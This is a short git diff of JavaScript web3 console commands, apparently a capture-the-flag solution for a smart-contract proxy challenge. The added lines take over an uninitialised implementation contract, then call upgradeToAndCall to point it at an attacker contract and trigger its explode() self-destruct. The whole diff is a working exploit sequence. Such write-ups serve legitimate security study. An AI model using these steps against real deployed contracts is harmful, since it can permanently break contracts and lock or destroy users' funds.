@@ -9,3 +9,28 @@ await web3.eth.sendTransaction({ from: player, to: implementationAddress, data: 
 upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
 
 await web3.eth.call({from: player, to: implementationAddress, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()
+
+attackAddress = "0x772B392F767AcB813e1A01A979433C4BB76A9481"
+
+explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes',
+            name: 'data'
+        }
+    ]
+}
+
+upgradeParams = [attackAddress, explodeData]
+
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+
+await web3.eth.sendTransaction({from: player, to: implementationAddress, data: upgradeData})
